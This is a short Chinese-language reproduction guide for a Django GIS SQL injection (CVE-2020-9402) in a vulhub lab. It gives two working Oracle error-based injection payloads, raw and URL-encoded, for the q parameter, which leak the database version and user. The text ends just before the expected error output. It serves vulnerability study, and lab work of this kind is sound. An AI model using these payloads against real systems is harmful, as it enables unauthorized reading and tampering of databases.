### Django GIS SQL注入漏洞复现

## 漏洞详情

Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。  Django  1.11.29之前的1.11.x版本、2.2.11之前的2.2.x版本和3.0.4之前的3.0.x版本中存在SQL注入漏洞。攻击者可借助特制的SQL语句利用该漏洞查看、添加、修改或删除数据库中的信息。

## 漏洞环境

[环境搭建](https://github.com/vulhub/vulhub/blob/master/django/CVE-2020-9402)，环境启动后，访问http://your-ip:8000即可看到Django默认首页。

## 漏洞复现

payload1：
 访问http://your-ip:8000/vuln/，在该网页中使用get方法构造q的参数，构造SQL注入的字符串`20) = 1 OR (select utl_inaddr.get_host_name((SELECT version FROM v$instance)) from dual) is null OR (1+1`

payload2：
 访问http://your-ip:8000/vuln2/。 在该网页中使用get方法构造q的参数，构造出SQL注入的字符串`0.05))) FROM "VULN_COLLECTION2" where (select utl_inaddr.get_host_name((SELECT user FROM DUAL)) from dual) is not null --`

```bash
http://your-ip:8000/vuln/?q=20)%20%3D%201%20OR%20(select%20utl_inaddr.get_host_name((SELECT%20version%20FROM%20v%24instance))%20from%20dual)%20is%20null%20%20OR%20(1%2B1
1
http://your-ip:8000/vuln2/?q=0.05)))%20FROM%20%22VULN_COLLECTION2%22%20%20where%20%20(select%20utl_inaddr.get_host_name((SELECT%20user%20FROM%20DUAL))%20from%20dual)%20is%20not%20null%20%20--
1
```

可见，括号已注入成功，SQL语句查询报错：







